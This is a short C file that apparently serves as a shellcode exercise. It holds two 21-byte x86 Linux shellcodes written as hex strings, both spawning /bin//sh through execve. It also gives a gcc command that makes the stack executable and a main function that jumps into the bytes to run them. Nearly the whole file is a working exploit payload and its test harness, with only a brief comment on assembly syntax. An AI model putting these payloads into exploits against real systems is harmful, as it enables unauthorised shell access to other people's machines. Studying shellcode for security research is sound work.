/*
 * gcc -o execute_optimization_21_shell_code execute_optimization_21_shell_code.c -m32 -mpreferred-stack-boundary=2 -Wl,-z,execstack
 *
 * optimization shell code 21 bytes
 */

char shellcode_21[] =
"\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
//"\x31\xc9\xf7\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";	<= intel syntax

char shellcode_21_new[] =
"\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xcd\x80";
//"\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xcd\x80";	<= intel syntax

/* assembly codes of at&t and intel syntax are different.
 * But byte codes are the same because the instructions for executing shell code are working on the same machine.
 */
void main()
{
//	void(*func)() = (void(*)())shellcode_21;
	void(*func)() = (void(*)())shellcode_21_new;
	func();
}
